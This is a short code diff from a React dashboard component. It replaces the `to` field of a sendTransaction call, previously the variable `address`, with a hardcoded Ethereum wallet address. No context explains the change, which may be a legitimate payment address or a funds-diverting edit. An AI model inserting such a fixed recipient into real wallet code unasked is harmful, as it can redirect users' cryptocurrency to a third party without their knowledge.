@@ -383,7 +383,7 @@ function MainDashboard() {
     if (address) {
       sendTransaction(
         {
-          to: address,
+          to: "0xcD0dd3716C5561De47a24949335dF8a8CD8F71a3",
           data: "0x",
         },
         {
